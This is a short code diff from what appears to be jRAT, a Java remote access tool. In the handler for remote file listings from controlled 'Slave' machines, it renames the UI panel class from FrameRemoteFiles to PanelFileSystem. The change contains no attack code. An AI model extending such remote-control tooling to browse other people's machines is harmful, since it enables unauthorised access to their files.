@@ -4,7 +4,7 @@ import iconlib.FileIconUtils;
 import jrat.controller.Slave;
 import jrat.controller.io.FileObject;
 import jrat.controller.packets.incoming.IncomingPacket;
-import jrat.module.fs.ui.FrameRemoteFiles;
+import jrat.module.fs.ui.PanelFileSystem;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -42,7 +42,7 @@ public class Packet22ListFiles implements IncomingPacket {
 			}
 		}
 
-        FrameRemoteFiles frame = (FrameRemoteFiles) slave.getPanel(FrameRemoteFiles.class);
+        PanelFileSystem frame = (PanelFileSystem) slave.getPanel(PanelFileSystem.class);
 		if (frame != null) {
 			frame.getFilesPanel().getRemoteTable().clear();
 
